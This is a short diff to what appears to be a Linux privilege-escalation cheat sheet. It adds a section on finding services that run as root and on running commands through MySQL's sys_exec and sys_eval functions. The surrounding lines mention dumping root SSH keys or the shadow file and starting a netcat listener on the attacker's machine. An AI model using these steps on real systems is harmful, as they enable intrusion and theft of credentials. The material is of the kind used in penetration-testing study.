@@ -174,7 +174,21 @@ Note: if u want to dump file from a server like a root’s ssh key, Shadow file 
     Setup Listener on attacker : nc –lvp 8080
 
 
----- Other ----
+**Other**
+
+Checking for running services running as root
+
+        ps aux
+        
+MySQL
+
+if this is running as root you can run commands if you are able to log in:
+
+        select sys_exec('whoami');
+        select sys_eval('whoami');
+
+
+
 Using apache Command
 sadly u cant get Shell and Cant edit system files.
 
